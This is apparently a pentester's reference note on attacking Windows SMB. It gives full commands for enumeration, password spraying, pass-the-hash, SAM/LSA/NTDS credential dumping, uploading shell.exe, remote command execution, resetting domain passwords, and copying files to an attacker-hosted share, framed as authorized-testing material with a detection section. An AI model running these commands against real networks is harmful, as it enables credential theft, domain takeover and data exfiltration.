# SMB

Windows file sharing, on **445/tcp** (direct) and **139/tcp** (legacy NetBIOS session). The highest-value protocol on an internal test: one valid credential turns SMB into a map of users, groups, password policy, OS versions, and every share the account can read.

This note is the **tool reference** — which tool to reach for and its main flags. The end-to-end workflow lives in [AD — Enumeration](../AD/Enumeration.md); execution and credential access live in [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) and the [Impacket Toolkit](../AD/Impacket%20Toolkit.md).

> Authorized engagements only. Enumerate read-only first and check the **password policy before any spraying** — SMB is where you lock out a domain. Share contents are client data; see the handling rules in your engagement scope.

## Contents

- [Which tool for what](#which-tool-for-what)
- [Enumeration checklist](#enumeration-checklist)
- [netexec — sweep and enumerate](#netexec--sweep-and-enumerate)
- [crackmapexec (cme) — legacy, use netexec](#crackmapexec-cme--legacy-use-netexec)
- [smbclient — interactive file access](#smbclient--interactive-file-access)
- [smbmap — permission map](#smbmap--permission-map)
- [enum4linux-ng — one-shot report](#enum4linux-ng--one-shot-report)
- [rpcclient — MSRPC queries](#rpcclient--msrpc-queries)
- [nmap NSE — at subnet scale](#nmap-nse--at-subnet-scale)
- [Impacket — protocol level](#impacket--protocol-level)
- [smbserver.py — receive files on your box](#smbserverpy--receive-files-on-your-box)
- [What to record for the report](#what-to-record-for-the-report)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Which tool for what

| Tool | Reach for it when | Strength |
| --- | --- | --- |
| **netexec** (`nxc`) | Default. Anything across more than one host | Sweeps a /24, tests creds everywhere, enumerates in one pass |
| **crackmapexec** (`cme`) | You only have cme on the box | Deprecated → it became netexec; identical syntax |
| **smbclient** | You need to actually browse and pull files | Interactive FTP-like shell; ships with Samba, on every Kali |
| **smbmap** | "What can this account read and write?" | Clean per-share READ/WRITE map, recursive listing |
| **enum4linux-ng** | First look at a single host or DC | One command, full structured report, JSON/YAML output |
| **rpcclient** | netexec's enumeration is blocked | Raw MSRPC queries — works when wrappers fail |
| **nmap NSE** | Signing, dialects and vulns at scale | Already in your scan; see [nmap](nmap.md) |
| **Impacket** | Protocol-level work and exec | Python, scriptable; see [Impacket Toolkit](../AD/Impacket%20Toolkit.md) |

Null session (`-u '' -p ''`) and guest (`-u guest -p ''`) are always the first two things to try — a surprising number of hosts still allow one.

## Enumeration checklist

Run top to bottom so nothing gets missed. `$T` = target, `$U`/`$P` = creds once you have them. Each step links to its section for flags/detail.

```bash
T=10.10.10.40
```

**1. Confirm SMB + posture** (signing off = relay target, SMBv1 = old-RCE surface)

```bash
sudo nmap -p139,445 -Pn --script "smb-protocols,smb2-security-mode,smb-os-discovery" $T
nxc smb $T                                   # OS, domain, signing, SMBv1 in one line
```

**2. Try unauthenticated access** — null, then guest

```bash
nxc smb $T -u '' -p ''                        # null
nxc smb $T -u guest -p ''                     # guest
smbclient -L //$T -N                          # list shares, no creds
rpcclient -U '' -N $T -c 'querydominfo;enumdomusers;getdompwinfo'
```

**3. Shares — what exists and what you can touch**

```bash
nxc smb $T -u '' -p '' --shares               # or with creds once you have them
smbmap -H $T -u '' -p ''                       # READ/WRITE per share
```

**4. Users — build the spray list** (null/guest or creds)

```bash
nxc smb $T -u '' -p '' --users                 # or --rid-brute if --users is blocked
rpcclient -U '' -N $T -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
enum4linux-ng -A $T                            # catch-all: users, groups, shares, policy, OS
```

**5. Password policy — BEFORE any spraying** (don't lock the domain)

```bash
nxc smb $T -u '' -p '' --pass-pol
rpcclient -U '' -N $T -c 'getdompwinfo'
```

**6. Once you have ONE credential** — find where it works and what it unlocks

```bash
nxc smb $T -u "$U" -p "$P"                      # look for "Pwn3d!" = local admin
nxc smb <subnet> -u "$U" -p "$P"                # spray the cred across the subnet
nxc smb $T -u "$U" -p "$P" --shares --users --pass-pol --groups --loggedon-users
smbmap -H $T -u "$U" -p "$P" -R --depth 5 -A '\.(txt|xml|ini|conf|config|kdbx|bak|sql)$'   # hunt secrets in shares
nxc smb $T -u "$U" -p "$P" -M spider_plus       # index every readable file
```

**7. If "Pwn3d!" (local admin)** — dump, then pivot (scope-permitting)

```bash
nxc smb $T -u "$U" -p "$P" --sam --lsa          # local secrets
nxc smb <DC> -u "$U" -p "$P" --ntds             # DCSync if it's a DC / you have the rights
```

→ credential access, lateral movement and DCSync detail live in [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md).

**Don't-miss ticklist:**

- [ ] Checked **SMB signing** (`--gen-relay-list`) and **SMBv1** — both are report findings on their own.
- [ ] Tried **null AND guest** — and anonymous `rpcclient`/`smbclient`, not just `nxc`.
- [ ] Got the **password policy before spraying**.
- [ ] Enumerated users by **both** `--users` and **RID brute** (one often works when the other is blocked).
- [ ] **Spidered every readable share** for configs/backups/creds — this is where the win usually is.
- [ ] Re-ran enumeration **authenticated** once you had a cred — it shows far more than null.
- [ ] Sprayed each found cred **across the subnet**, looking for `Pwn3d!`.

## netexec — sweep and enumerate

Successor to CrackMapExec (which is archived — `cme` is dead, use `nxc`). Flags below verified against current NetExec source.

```bash
nxc smb 10.10.10.0/24                                  # sweep: hostname, domain, OS, signing, SMBv1
nxc smb 10.10.10.0/24 -u <user> -p <pass>               # where do these creds work? ("Pwn3d!" = local admin)
nxc smb <target> -u <user> -p <pass> --local-auth       # local account, not domain
nxc smb <target> -u <user> -H <nthash>                  # pass-the-hash
```

| Flag | Does (from source help) |
| --- | --- |
| `--shares` | "Enumerate shares and access" — optionally filter: `--shares read`, `--shares write`, `--shares read,write` |
| `--filter-shares READ WRITE` | Filter shares by access level |
| `--users [USER]` | "Enumerate domain users" — name one to query just that user |
| `--groups [GROUP]` | "Enumerate domain groups" — name one to list its members |
| `--local-groups [GROUP]` | Same for local groups |
| `--computers` | Enumerate computer accounts |
| `--pass-pol` | "dump password policy" — **run this before any spraying** |
| `--rid-brute [MAX_RID]` | "Enumerate users by bruteforcing RIDs" (default 4000) — works when `--users` is blocked |
| `--smb-sessions` | "Enumerate active smb sessions" |
| `--reg-sessions` | Sessions via Remote Registry |
| `--loggedon-users` | "Enumerate logged on users" — finds where admins are |
| `--disks` / `--interfaces` | Enumerate disks / network interfaces (interfaces reveal other subnets to [pivot](../Networking/Pivoting%20%26%20Tunneling.md) into) |
| `--spider <SHARE>` | Spider a share; pair with `--pattern`, `--regex`, `--depth`, `--content` |
| `--get-file <remote> <local>` | Pull one file |
| `--put-file <local> <remote>` | Push one file |
| `--gen-relay-list <file>` | "outputs all hosts that don't require SMB signing" — your relay target list |
| `--no-smbv1` | Force SMBv1 off in the connection |
| `-M <module>` | Modules, e.g. `-M spider_plus` to index every readable file |

> **Flag drift worth knowing:** older cheatsheets say `--sessions`. Current netexec splits it into **`--smb-sessions`** and **`--reg-sessions`**. If a flag errors, `nxc smb --help` is the truth for your build.

Credential dumping flags (`--sam`, `--lsa`, `--ntds`, `--dpapi`, `--laps`) need local admin and are covered in [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md).

## crackmapexec (cme) — legacy, use netexec

CrackMapExec is the tool netexec was forked from. The original repo is **archived and unmaintained** — the project moved to [NetExec](#netexec--sweep-and-enumerate) (`nxc`). You'll still meet `cme` on older boxes, in existing playbooks, and in most tutorials written before 2024, so it's worth knowing the two are interchangeable.

**The syntax is identical — just swap the binary name:**

```bash
cme smb 10.10.10.0/24 -u <user> -p <pass>          # == nxc smb ...
cme smb <target> -u <user> -p <pass> --shares       # same flags
cme smb <target> -u <user> -H <nthash>              # pass-the-hash
cme smb <target> -u users.txt -p 'Spring2026!' --continue-on-success   # spray
```

Everything in the [netexec section](#netexec--sweep-and-enumerate) — `--shares`, `--users`, `--pass-pol`, `--rid-brute`, `--sam`/`--lsa`/`--ntds`, `-M <module>`, the other protocols (`winrm`, `ldap`, `mssql`, `ssh`) — applies to `cme` unchanged, **except** the session flags: on `cme` it's the single `--sessions`, which netexec later split into `--smb-sessions` / `--reg-sessions`.

> If you're setting up a box, install **netexec**, not CrackMapExec — cme gets no new protocols, modules or fixes. Treat `cme` as a read-only alias for `nxc` in your head. Full flag detail lives in [netexec](#netexec--sweep-and-enumerate) so it isn't duplicated here.

## smbclient — interactive file access

```bash
smbclient -L //<target> -N                              # list shares, no credentials
smbclient -L //<target> -U '<domain>\<user>%<pass>'     # list shares, authenticated
smbclient "//<target>/<share>" -N                       # connect anonymously
smbclient "//<target>/<share>" -U '<domain>\<user>%<pass>'
smbclient "//<target>/<share>" -U <user> --pw-nt-hash   # authenticate with an NT hash
smbclient "//<target>/<share>" -N -c 'ls'               # one command, non-interactive
```

Once connected:

| Command | Does |
| --- | --- |
| `ls` / `cd <dir>` | List / change directory |
| `get <file>` / `put <file>` | Download / upload one file |
| `prompt off` then `recurse on` then `mget *` | **Pull a whole tree non-interactively** |
| `more <file>` | Read a file without downloading it |
| `lcd <dir>` | Change the *local* directory downloads land in |
| `mask ""` | Clear the filename mask before a recursive `mget` |
| `tarmode` / `tar c <file>.tar` | Archive a share server-side |

Legacy hosts that only speak SMBv1 need the dialect forced:

```bash
smbclient -L //<target> -N --option='client min protocol=NT1'
smbclient -L //<target> -N -m SMB2                      # or pin a specific dialect
```

## smbmap — permission map

The fastest answer to "what can this account actually touch?" — netexec tells you a share's access flag, smbmap is purpose-built for walking the contents and pulling files, organised by what you're doing.

### Connect & map access

```bash
smbmap -H <target> -u <user> -p <pass> -d <domain>      # per-share READ ONLY / READ, WRITE map
smbmap -H <target> -u '' -p ''                          # null session
smbmap -H <target> -u guest -p ''                       # guest
smbmap -H <target> -u <user> -p ':<nthash>'             # pass-the-hash (LM:NT; LM can be blank)
smbmap -H <target> -u <user> -p <pass> -k               # Kerberos
smbmap --host-file hosts.txt -u <user> -p <pass>        # sweep many hosts for a share you can write
```

The first line is the point: it prints each share with `READ ONLY` / `READ, WRITE` / `NO ACCESS` — instantly showing where your account can read secrets or drop a payload.

### Browse & find files

```bash
smbmap -H <target> -u <user> -p <pass> -r <share>              # list one share, top level
smbmap -H <target> -u <user> -p <pass> -R <share>              # recurse the WHOLE tree
smbmap -H <target> -u <user> -p <pass> -R <share> --dir-only   # structure only, no filenames
smbmap -H <target> -u <user> -p <pass> -R --depth 5            # limit recursion depth
smbmap -H <target> -u <user> -p <pass> -A '\.(txt|xml|ini|conf|kdbx|config)$'   # grab files by regex as it walks
smbmap -H <target> -u <user> -p <pass> -g                      # grepable output (feed pipelines)
```

`-R` across every readable share is how you find the config/backup/creds file that makes the engagement — it's the manual version of a spider.

### Pull & push specific files

```bash
smbmap -H <target> -u <user> -p <pass> --download '<share>\path\to\creds.xlsx'   # pull one file
smbmap -H <target> -u <user> -p <pass> --upload ./shell.exe '<share>\shell.exe'  # push (needs WRITE)
```

### Execute commands (needs admin)

smbmap can run commands over SMB where the account is privileged — noisy (creates a service), so prefer it only when you already have admin and want a quick check:

```bash
smbmap -H <target> -u Administrator -p <pass> -x 'whoami'          # run a command
smbmap -H <target> -u Administrator -p ':<nthash>' -x 'ipconfig'   # via PtH
```

For real shells prefer Impacket's `psexec.py`/`wmiexec.py` — see [Impacket Toolkit](../AD/Impacket%20Toolkit.md).

### Flags

| Flag | Does |
| --- | --- |
| `-H` / `--host-file` | One target / a file of targets |
| `-u -p -d` | User, password, domain (`-p` takes `LM:NT` or `:NT` for pass-the-hash) |
| `-k` | Kerberos auth |
| `-r <share>` / `-R <share>` | List / **recursively** list (omit share = all shares) |
| `--depth <n>` | Cap recursion depth |
| `--dir-only` | Directories only, no files |
| `-s <share>` | Restrict to one share |
| `-A <regex>` | Auto-download files whose path matches — **scope-sensitive, be specific** |
| `--download <path>` / `--upload <src> <dst>` | Pull / push one file (path uses `share\dir\file`) |
| `-x <cmd>` | Execute a command (needs admin; creates a service) |
| `-g` | Grepable output |
| `-q` | Quiet |

> Flag names vary between the old Python2 smbmap and the current build — if `--download`/`-A` behave oddly, check `smbmap -h` for your version. On modern Kali it's the maintained build.

## enum4linux-ng — one-shot report

Python rewrite of the original Perl `enum4linux` (`enum4linux-ng.py`, installed as `enum4linux-ng` on Kali). It wraps the SMB/MSRPC/LDAP tools below into **one command with structured, parseable output** — the best first look at a host or DC you know nothing about. Under the hood it drives `smbclient`, `rpcclient`, `nmblookup` and LDAP, so it's a convenience layer, not a new protocol.

### Connect

```bash
enum4linux-ng -A <target>                      # null session (default) — full auto report
enum4linux-ng -A -u <user> -p <pass> <target>  # authenticated — much richer
enum4linux-ng -A -u guest -p '' <target>       # guest
enum4linux-ng -A -u <user> -H <nthash> <target>   # pass-the-hash
enum4linux-ng -A -u <user> -K <ccache> <target>   # Kerberos ticket
```

### Main use cases

```bash
# the one you run first — everything, unauthenticated
enum4linux-ng -A <target>

# targeted when you only want one thing (faster, quieter)
enum4linux-ng -U <target>            # users (-> spray list)
enum4linux-ng -S <target>            # shares
enum4linux-ng -P <target>            # password policy (run BEFORE spraying)
enum4linux-ng -G <target>            # groups
enum4linux-ng -O <target>            # OS info

# RID cycling when -U is blocked (not part of -A)
enum4linux-ng -R <target>            # default RID range
enum4linux-ng -R 10000 <target>      # extend the range

# save structured output for the report / to grep instead of re-running
enum4linux-ng -A -oJ report <target>   # report.json
enum4linux-ng -A -oY report <target>   # report.yaml
```

### Flags

`-A` expands to **`-U -G -S -P -O -N -I -L`** plus `nmblookup` — per its own help text:

| Flag | Gets |
| --- | --- |
| `-U` | Users via RPC |
| `-G` | Groups via RPC |
| `-S` | Shares via RPC |
| `-P` | **Password policy** via RPC |
| `-O` | OS information via RPC |
| `-N` | NetBIOS names lookup (like `nbtstat`) |
| `-I` | Printer information via RPC |
| `-L` | Extra domain info via LDAP — **DCs only** |
| `-C` | Services via RPC (not in `-A`) |
| `-R [size]` | RID cycling (not in `-A`) |
| `-H <nthash>` / `-K <ticket>` | Authenticate with a hash / Kerberos ticket |
| `-oJ` / `-oY` | JSON / YAML output — parse it instead of re-running |

### Reading the output

`-A` dumps a lot; skim for the sections that matter and pull the user list for spraying:

```bash
enum4linux-ng -A -oJ report $T >/dev/null       # write report.json
jq -r '.users[]?.username' report.json > users.txt     # clean spray list straight from JSON
```

Jump to these in the output: **Users** (→ `users.txt`), **Policy** (lockout threshold before you spray), **Shares** (access), and **OS/Domain** (is it a DC?). The JSON/YAML is the point — enumerate once, then grep the file instead of re-hitting the target.

**When to use it vs the rest:** `enum4linux-ng` for the fast, complete *first pass* on one host; [netexec](#netexec--sweep-and-enumerate) when you're working **across many hosts** or testing creds; [rpcclient](#rpcclient--msrpc-queries) when you need **one exact MSRPC call** or e4l-ng's wrapped calls get blocked. They overlap on purpose — run e4l-ng first, reach for the others when it stalls.

## rpcclient — MSRPC queries

Talks MSRPC over SMB directly — the most precise tool for domain data, and the fallback when `nxc`/`enum4linux` are blocked or you want to run one exact query. Everything below is a command you type **inside** the rpcclient shell (or pass with `-c`).

### Connect

```bash
rpcclient -U '' -N <target>                       # null session — try this first
rpcclient -U 'guest%' <target>                    # guest, empty password
rpcclient -U '<domain>\<user>%<pass>' <target>    # with credentials
rpcclient -U '<user>' --pw-nt-hash <target>       # pass-the-hash (give the NT hash as the password)
rpcclient -U '<user>%<pass>' -k <target>          # Kerberos
rpcclient -U '' -N <target> -c 'querydominfo'     # run ONE command and exit (scriptable)
rpcclient -U '' -N <target> -c 'enumdomusers' | ...  # chain several with ; inside -c
```

### Enumerate users — build the spray list

The first goal on most engagements: a valid username list, with no password attempts (no lockout risk).

```bash
enumdomusers                 # all users + their RIDs:  user:[jsmith] rid:[0x44f]
querydispinfo                # same but with full names/descriptions (descriptions sometimes hold passwords!)
queryuser 0x44f              # one user in depth: last logon, badpwdcount, flags, when pw was set
queryusergroups 0x44f        # which groups that user (by RID) belongs to
```

```bash
# turn enumdomusers into a clean list for spraying
rpcclient -U '' -N <target> -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
```

Feed `users.txt` to [password spraying](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) — but read the policy first (below).

### RID cycling — users even when `enumdomusers` is blocked

If direct user enumeration is denied but a null/low-priv session works, walk the RIDs instead. RID **500** is always the built-in Administrator; real users usually start at **1000**.

```bash
lsaquery                     # get the domain SID, e.g. S-1-5-21-1234567890-...-...
lookupsids S-1-5-21-1234567890-...-...-500      # resolve one RID -> name (500 = Administrator)
```

```bash
# brute the RID range from the shell, resolving each to a name
for i in $(seq 500 1100); do \
  rpcclient -U '' -N <target> -c "lookupsids S-1-5-21-1234567890-...-$i" 2>/dev/null \
  | grep -v 'NONE'; done
```

`lookupnames <name>` does the reverse (name → SID) — handy to confirm an account exists and find its RID.

### Password policy — before you spray

```bash
getdompwinfo                 # min length, complexity flag
getusrdompwinfo 0x44f        # policy as it applies to one user
```

**Run this before any spraying.** The lockout threshold here is what keeps you from locking out the domain — see [password spraying](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md).

### Groups — find the admins

```bash
enumdomgroups                # domain groups + RIDs
enumalsgroups builtin        # built-in aliases (Administrators, Remote Desktop Users, ...)
enumalsgroups domain         # domain-local aliases
querygroupmem 0x200          # members of a group by RID -> who's in Domain Admins
querygroup 0x200             # group details
```

Workflow: `enumdomgroups` → find "Domain Admins" RID → `querygroupmem <rid>` → `lookupsids` each member → that's your high-value target list.

### Domain, server & SID info

```bash
srvinfo                      # OS version + server type (is this the DC?)
querydominfo                 # domain name, role, logged-on user count
lsaquery                     # domain SID
lsaenumsid                   # SIDs the box knows about
lookupnames administrator    # name -> SID (confirms the admin account + domain SID)
lookupsids <sid>             # SID -> name
```

### Shares

```bash
netshareenumall              # ALL shares — including ones hidden from `smbclient -L`
netsharegetinfo <share>      # a share's ACL and type
```

### Privileges

```bash
enumprivs                    # privileges the current token holds (SeBackup, SeDebug... = escalation)
lsaenumprivsaccount <sid>    # privileges assigned to a specific account
```

### Post-compromise — user & password operations

These **modify the domain** and need the rights to do so (local admin on the box, or a delegated ACL such as `ForceChangePassword`/`WriteProperty` from [BloodHound](../AD/README.md)). Authorized engagements only, and log every change in your `tools.txt`.

```bash
# reset a user's password (the classic ForceChangePassword abuse — level 23)
setuserinfo2 <username> 23 '<NewPass123!>'
# create / delete a domain user
createdomuser <name>
deletedomuser <name>
# add your controlled user to a group via its RID (e.g. Domain Admins) where rights allow
# (confirm the exact samr call your build supports; setuserinfo/altername vary by version)
```

`setuserinfo2 <user> 23 '<pass>'` is the one to remember: when BloodHound shows you hold `ForceChangePassword` over a user, this resets their password without knowing the old one — then authenticate as them.

> If a command returns `NT_STATUS_ACCESS_DENIED`, your session lacks the rights for that call — drop to read-only enumeration, or come back with better creds. `NT_STATUS_ACCESS_DENIED` on `enumdomusers` is exactly when you switch to **RID cycling** (above).

## nmap NSE — at subnet scale

Already in your scan output; full detail in [nmap](nmap.md).

```bash
sudo nmap -p445 --open 10.10.10.0/24 -oA scans/smb                      # who's listening
sudo nmap -sC -p445 <target>                                             # default scripts (includes smb-os-discovery)
sudo nmap --script smb2-security-mode -p445 10.10.10.0/24                # signing posture across a subnet
sudo nmap --script smb-protocols -p445 <target>                          # which dialects, flags SMBv1
sudo nmap --script smb-enum-shares,smb-enum-users -p445 <target>         # not in the default category
sudo nmap --script "smb-vuln* and safe" -p445 <target>                   # known-vuln checks
```

`smb-os-discovery`, `smb-security-mode`, `smb2-security-mode` and `smb2-time` are in the `default` category, so `-sC` and `-A` run them for free. `smb-enum-shares`, `smb-enum-users` and the `smb-vuln-*` family are not — ask for them by name.

## Impacket — protocol level

| Script | Does |
| --- | --- |
| `smbclient.py <dom>/<user>:<pass>@<target>` | Interactive client, same idea as `smbclient` |
| `lookupsid.py <dom>/<user>:<pass>@<target>` | RID cycling to enumerate users |
| `samrdump.py <dom>/<user>:<pass>@<target>` | Users, groups and policy via SAMR |
| `netview.py -target <target> <dom>/<user>` | Sessions and logged-on users across hosts |
| `reg.py <dom>/<user>:<pass>@<target> query -keyName <key>` | Remote registry |

Target spec, install notes and the exec scripts (`psexec.py`, `smbexec.py`, `wmiexec.py`, `atexec.py`) are all in [Impacket Toolkit](../AD/Impacket%20Toolkit.md).

## smbserver.py — receive files on your box

The reverse direction: stand up a share on your attack box so a Windows host can copy to or from it. The standard way to move a file off a target that has no outbound HTTP.

```bash
# on the attack box, from your engagement evidence directory
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -user <u> -password <p>   # auth; some Windows builds require it
```

```cmd
:: on the Windows host
copy C:\path\file.txt \\<attack-ip>\share\
dir \\<attack-ip>\share\
```

Modern Windows refuses guest/unauthenticated SMB by default, so use the `-user`/`-password` form if an anonymous share is rejected. Shut it down when you're done — it's an open share on the engagement network.

## What to record for the report

Four things from SMB enumeration carry straight into findings:

| Finding | Where you saw it | Why it matters |
| --- | --- | --- |
| **SMB signing not required** | `nxc smb <subnet>` signing flag, `smb2-security-mode`, `--gen-relay-list` | NTLM relay path; a Group Policy one-liner fixes it |
| **SMBv1 enabled** | `nxc smb` sweep, `smb-protocols` | Deprecated, and the surface for the classic SMB RCE family |
| **Null or guest session permitted** | `-u '' -p ''`, `smbclient -L -N` | Unauthenticated disclosure of users, shares and policy |
| **Over-permissive share ACLs** | `smbmap`, `nxc --shares` | Where credentials, backups and config files actually leak from |

Quantify the share finding rather than dumping it: "the `Finance` share is readable by Domain Users and contains 1,400 files including `creds.xlsx`" is a finding; a copy of the share is an incident.

## Defense / detection

- **Require SMB signing** on servers *and* clients via Group Policy, and **disable SMBv1** entirely — see [3. Active Directory Hardening](../../Defense/System%20and%20Services%20Hardening/3.%20Active%20Directory%20Hardening.md) and [2. Windows Hardening](../../Defense/System%20and%20Services%20Hardening/2.%20Windows%20Hardening.md).
- **Block null/anonymous sessions:** `RestrictAnonymous` / `RestrictAnonymousSAM`, and don't leave `guest` enabled.
- **Least privilege on shares.** "Authenticated Users: Full Control" is the single most common root cause of credential leakage on an internal test.
- **Don't expose 445 to the internet**, and segment it internally — flat SMB reachability is what turns one foothold into domain-wide access.
- **Detect:** one source touching 445 on many hosts in a short window (that's a sweep); `--rid-brute` as a burst of SAMR lookups; Windows event **5140/5145** for share access, **4624 type 3** for network logons, **4625** bursts for spraying. See [Host-based logging on Windows](../../Defense/Logging/Host-based/Windows.md) and [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md).
- A sudden spike in a single account reading many shares is the spider step — alert on it.

## Related

[nmap](nmap.md) · [Metasploit](Metasploit.md) · [tmux](tmux.md) · [folder README](README.md) · [AD — Enumeration](../AD/Enumeration.md) · [Impacket Toolkit](../AD/Impacket%20Toolkit.md) · [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) · [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)
